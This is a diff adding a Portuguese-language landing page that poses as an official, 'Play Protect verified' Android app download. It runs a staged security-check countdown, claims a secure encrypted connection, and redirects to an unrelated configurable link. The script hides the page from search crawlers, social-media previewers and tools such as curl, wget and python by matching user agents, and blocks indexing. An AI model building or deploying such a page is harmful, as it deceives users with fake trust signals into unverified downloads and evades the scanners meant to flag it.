@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+    <title>Baixar aplicativo grátis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        /* Efeito de luz de fundo */
+        .background-effects {
+            position: fixed;
+            inset: 0;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .glow-top {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(34, 197, 94, 0.1) 0%, transparent 70%);
+            border-radius: 50%;
+            filter: blur(60px);
+        }
+
+        .glow-bottom {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.1) 0%, transparent 70%);
+            border-radius: 50%;
+            filter: blur(60px);
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 420px;
+            width: 100%;
+        }
+
+        .card {
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(71, 85, 105, 0.3);
+            border-radius: 24px;
+            padding: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .image-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 32px;
+        }
+
+        .image-wrapper {
+            position: relative;
+        }
+
+        .image-glow {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, #22c55e 0%, #10b981 100%);
+            border-radius: 24px;
+            filter: blur(20px);
+            opacity: 0.4;
+        }
+
+        .image-box {
+            position: relative;
+            width: 96px;
+            height: 96px;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .image-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .image-placeholder {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #94a3b8;
+            text-align: center;
+            margin-bottom: 32px;
+            padding: 0 8px;
+        }
+
+        .content {
+            min-height: 160px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* Estado Inicial */
+        .state-initial .btn-primary {
+            display: block;
+        }
+
+        .state-initial .verification-content,
+        .state-initial .ready-content {
+            display: none;
+        }
+
+        /* Estado Verificando */
+        .state-verifying .btn-primary,
+        .state-verifying .ready-content {
+            display: none;
+        }
+
+        .state-verifying .verification-content {
+            display: block;
+        }
+
+        /* Estado Pronto */
+        .state-ready .btn-primary,
+        .state-ready .verification-content {
+            display: none;
+        }
+
+        .state-ready .ready-content {
+            display: block;
+        }
+
+        .verification-content {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 16px;
+            position: relative;
+        }
+
+        .spinner-circle {
+            width: 100%;
+            height: 100%;
+            border: 4px solid rgba(71, 85, 105, 0.3);
+            border-top-color: #22c55e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .verification-text {
+            font-size: 14px;
+            color: #4ade80;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(71, 85, 105, 0.3);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #22c55e 0%, #10b981 100%);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 4px;
+        }
+
+        .timer-text {
+            font-size: 12px;
+            color: #64748b;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(34, 197, 94, 0.2);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(34, 197, 94, 0.3);
+            background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
+        }
+
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .badge {
+            display: inline-block;
+            font-size: 10px;
+            color: #64748b;
+            text-align: center;
+            margin-top: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+
+        .error-message {
+            display: none;
+            padding: 12px;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 8px;
+            color: #fca5a5;
+            font-size: 13px;
+            margin-top: 12px;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid rgba(71, 85, 105, 0.3);
+            text-align: center;
+        }
+
+        .footer-text {
+            font-size: 10px;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+
+        .ready-content {
+            text-align: center;
+        }
+
+        .download-icon {
+            font-size: 24px;
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-effects">
+        <div class="glow-top"></div>
+        <div class="glow-bottom"></div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <!-- Imagem -->
+            <div class="image-container">
+                <div class="image-wrapper">
+                    <div class="image-glow"></div>
+                    <div class="image-box">
+                        <div class="image-placeholder">📱</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Título -->
+            <h1>Baixar aplicativo grátis</h1>
+            <p class="subtitle">Versão oficial otimizada para o seu dispositivo Android</p>
+
+            <!-- Conteúdo Principal -->
+            <div class="content state-initial" id="mainContent">
+                <!-- Estado Inicial -->
+                <div class="state-initial">
+                    <button class="btn-primary" onclick="startVerification()">OBTER AGORA</button>
+                    <p class="badge">✓ Verificado pelo Play Protect</p>
+                </div>
+
+                <!-- Estado Verificando -->
+                <div class="verification-content">
+                    <div class="spinner">
+                        <div class="spinner-circle"></div>
+                    </div>
+                    <p class="verification-text">Verificando segurança...</p>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="progressBar"></div>
+                    </div>
+                    <p class="timer-text"><span id="timerText">15</span>s restantes</p>
+                </div>
+
+                <!-- Estado Pronto -->
+                <div class="ready-content">
+                    <button class="btn-primary" id="downloadBtn" onclick="handleDownload()">
+                        <span class="download-icon">⬇️</span>BAIXAR AGORA
+                    </button>
+                    <div class="error-message" id="errorMessage">
+                        <span>⚠️</span>
+                        <span id="errorText"></span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Rodapé -->
+            <div class="footer">
+                <p class="footer-text">🔒 Conexão segura e criptografada</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ⚠️ CONFIGURE AQUI O SEU LINK DE DOWNLOAD
+        const DOWNLOAD_LINK = 'https://gatasexy.com';
+        const VERIFICATION_TIME = 15; // segundos
+
+        let currentState = 'initial';
+        let verificationTimer = null;
+        let elapsedTime = 0;
+
+        function setState(newState) {
+            currentState = newState;
+            const mainContent = document.getElementById('mainContent');
+            mainContent.className = `content state-${newState}`;
+        }
+
+        function startVerification() {
+            setState('verifying');
+            elapsedTime = 0;
+            updateProgress();
+
+            verificationTimer = setInterval(() => {
+                elapsedTime++;
+                updateProgress();
+
+                if (elapsedTime >= VERIFICATION_TIME) {
+                    clearInterval(verificationTimer);
+                    setState('ready');
+                }
+            }, 1000);
+        }
+
+        function updateProgress() {
+            const progress = (elapsedTime / VERIFICATION_TIME) * 100;
+            const timeLeft = VERIFICATION_TIME - elapsedTime;
+
+            document.getElementById('progressBar').style.width = progress + '%';
+            document.getElementById('timerText').textContent = Math.max(0, timeLeft);
+        }
+
+        function handleDownload() {
+            const btn = document.getElementById('downloadBtn');
+            const errorMessage = document.getElementById('errorMessage');
+
+            btn.disabled = true;
+            btn.textContent = '⏳ Iniciando download...';
+
+            // Simular verificação de bot (no GitHub Pages, não temos servidor)
+            // Apenas redireciona após um pequeno delay
+            setTimeout(() => {
+                // Redirecionar para o link
+                window.location.href = DOWNLOAD_LINK;
+            }, 500);
+        }
+
+        // Proteção contra acesso direto por bots
+        // Se alguém tentar acessar sem esperar, não redireciona
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const botPatterns = [
+                'googlebot',
+                'bingbot',
+                'slurp',
+                'duckduckbot',
+                'baiduspider',
+                'yandexbot',
+                'facebookexternalhit',
+                'twitterbot',
+                'linkedinbot',
+                'curl',
+                'wget',
+                'python',
+                'scrapy',
+            ];
+
+            return botPatterns.some(pattern => userAgent.includes(pattern));
+        }
+
+        // Se for um bot, não fazer nada
+        if (isBot()) {
+            document.body.innerHTML = '<h1 style="color: white; text-align: center; margin-top: 50px;">Acesso não permitido</h1>';
+        }
+    </script>
+</body>
+</html>
